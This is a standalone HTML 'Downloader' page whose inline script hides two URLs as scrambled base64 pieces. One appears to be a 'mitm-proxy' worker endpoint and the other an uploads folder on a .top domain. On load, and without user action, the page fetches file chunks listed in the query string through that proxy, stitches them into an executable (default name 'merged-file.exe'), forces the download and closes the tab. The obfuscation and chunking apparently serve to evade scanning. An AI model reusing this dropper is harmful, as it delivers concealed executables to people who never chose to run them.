<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Downloader</title>
    <style>
        body { 
            margin: 0;
            padding: 0;
            height: 100vh;
            background: #0d1117; 
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }

        #bar-container { 
            width: 300px; 
            height: 6px; 
            background: #21262d; 
            border-radius: 4px;
            overflow: hidden;
            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
            opacity: 0; 
            transition: opacity 0.5s ease;
        }

        #bar-fill { 
            height: 100%; 
            background: linear-gradient(90deg, #2ea043, #3fb950); 
            width: 0%; 
            transition: width 0.2s ease-out;
            border-radius: 4px;
            box-shadow: 0 0 10px rgba(46, 160, 67, 0.4);
        }
    </style>
</head>
<body>

    <div id="bar-container"><div id="bar-fill"></div></div>

    <script>

    const _parts = [
        'aH', 'R0', 'cH', 'M6', 'Ly', '9t', 'aX', 'Rt', 'LX', 'By', 'b3', 'h5', 'Lm', 'Nm', 'b3', 'Az', 
        'M3', 'Vz', 'ZX', 'Iu', 'd2', '9y', 'a2', 'Vy', 'cy', '5k', 'ZXY', 'vP', '3Vy', 'bD0', 'YW', 
        'No', 'aW', '0u', 'dG', '9w', 'L2', 'Fz', 'c2', 'V0', 'cy', '91', 'cG', 'xv', 'YW', 'Rz', 
        'L2', 'Zp', 'bG', 'Vz', 'Lw', '=='
    ];

    const _r1 = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29];
    const _r2 = [0, 1, 2, 3, 4, 5, 6, 7, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51];

    const _rec = (recipe) => recipe.map(i => _parts[i]).join('');
    
    const _comp = (s) => window.atob(_rec(s));

    const Proxy = _comp(_r1); 
    const BASE_DL_URL = _comp(_r2);



        const barFill = document.getElementById('bar-fill');
        const barCont = document.getElementById('bar-container');

        function log(msg, type='') {
            console.log(`[${type || 'INFO'}] ${msg}`);
        }

        async function init() {
            const params = new URLSearchParams(window.location.search);
            const parts = [];
            let i = 1;
            
            while(params.has(String(i))) {
                parts.push(params.get(String(i)));
                i++;
            }

            if(parts.length === 0) {
                log("No file parts found (checked ?1=, ?2=...)", "error");
                return;
            }

            const fileName = params.get('name') || "merged-file.exe";
            
            barCont.style.opacity = '1';

            try {
                const chunks = [];
                
                for(let k=0; k < parts.length; k++) {
                    const percent = Math.round((k / parts.length) * 100);
                    barFill.style.width = percent + '%';
                    
                    log(`Downloading part ${k+1} of ${parts.length}...`);
                    
                    const chunk = await downloadPart(parts[k]);
                    chunks.push(chunk);
                }

                barFill.style.width = '100%';
                log("Merging files...", "success");

                const blob = new Blob(chunks, { type: 'application/octet-stream' });
                const url = window.URL.createObjectURL(blob);

                const a = document.createElement('a');
                a.href = url;
                a.download = fileName;
                document.body.appendChild(a);
                a.click();
                
                log(`Saved as: ${fileName}`, "success");
                
                setTimeout(() => {
                    barCont.style.opacity = '0';
                    window.URL.revokeObjectURL(url);
                    window.close();
                                        setTimeout(() => {
                        if (!window.closed) {
                           document.body.innerHTML = '<h1 style="color: #c9d1d9; font-family: sans-serif; font-size: 14px;">Download Complete. You can close this tab.</h1>';
                        }
                    }, 500);
                }, 2000);

            } catch (error) {
                log(`ERROR: ${error.message}`, "error");
                barFill.style.background = '#ff7b72';
                barFill.style.boxShadow = '0 0 10px rgba(255, 123, 114, 0.4)';
            }
        }

        async function downloadPart(fileId) {
            const fileUrl = BASE_DL_URL + fileId;
            const workerRequestUrl = Proxy + encodeURIComponent(fileUrl);
            

            const response = await fetch(workerRequestUrl, {
                method: 'GET',
                mode: 'cors'
            });

            if (!response.ok) {
                throw new Error(`Server Error ${response.status} for file ID ${fileId}`);
            }

            return await response.arrayBuffer();
        }

        window.onload = init;
    </script>
</body>
</html>